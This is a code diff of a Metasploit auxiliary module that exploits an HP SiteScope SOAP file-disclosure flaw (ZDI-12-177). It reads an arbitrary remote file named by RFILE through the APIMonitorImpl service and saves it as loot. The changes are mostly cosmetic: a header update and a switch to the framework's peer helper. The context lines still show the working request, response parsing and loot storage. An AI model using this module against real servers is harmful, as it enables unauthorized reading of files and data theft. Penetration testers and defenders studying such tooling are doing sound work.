@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -27,7 +25,7 @@ class Metasploit4 < Msf::Auxiliary
         [
           [ 'OSVDB', '85118' ],
           [ 'BID', '55269' ],
-          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-177/' ]
+          [ 'ZDI', '12-177' ]
         ],
       'Author'       =>
         [
@@ -48,16 +46,11 @@ class Metasploit4 < Msf::Auxiliary
     deregister_options('RHOST')
   end
 
-  def rport
-    datastore['RPORT']
-  end
-
   def run_host(ip)
-    @peer = "#{rhost}:#{rport}"
     @uri = normalize_uri(target_uri.path)
     @uri << '/' if @uri[-1,1] != '/'
 
-    print_status("#{@peer} - Connecting to SiteScope SOAP Interface")
+    print_status("#{peer} - Connecting to SiteScope SOAP Interface")
 
     uri = normalize_uri(@uri, 'services/APIMonitorImpl')
 
@@ -66,7 +59,7 @@ class Metasploit4 < Msf::Auxiliary
       'method'  => 'GET'})
 
     if not res
-      print_error("#{@peer} - Unable to connect")
+      print_error("#{peer} - Unable to connect")
       return
     end
 
@@ -95,7 +88,7 @@ class Metasploit4 < Msf::Auxiliary
     data << "</wsns0:Body>" + "\r\n"
     data << "</wsns0:Envelope>" + "\r\n"
 
-    print_status("#{@peer} - Retrieving the file contents")
+    print_status("#{peer} - Retrieving the file contents")
 
     uri = normalize_uri(@uri, 'services/APIMonitorImpl')
 
@@ -111,16 +104,16 @@ class Metasploit4 < Msf::Auxiliary
     if res and res.code == 200 and res.body =~ /<loadFileContentReturn xsi:type="xsd:string">(.*)<\/loadFileContentReturn>/m
       loot = CGI.unescapeHTML($1)
       if not loot or loot.empty?
-        print_status("#{@peer} - Retrieved empty file")
+        print_status("#{peer} - Retrieved empty file")
         return
       end
       f = ::File.basename(datastore['RFILE'])
       path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-      print_status("#{@peer} - #{datastore['RFILE']} saved in #{path}")
+      print_status("#{peer} - #{datastore['RFILE']} saved in #{path}")
       return
     end
 
-    print_error("#{@peer} - Failed to retrieve the file")
+    print_error("#{peer} - Failed to retrieve the file")
   end
 
 end
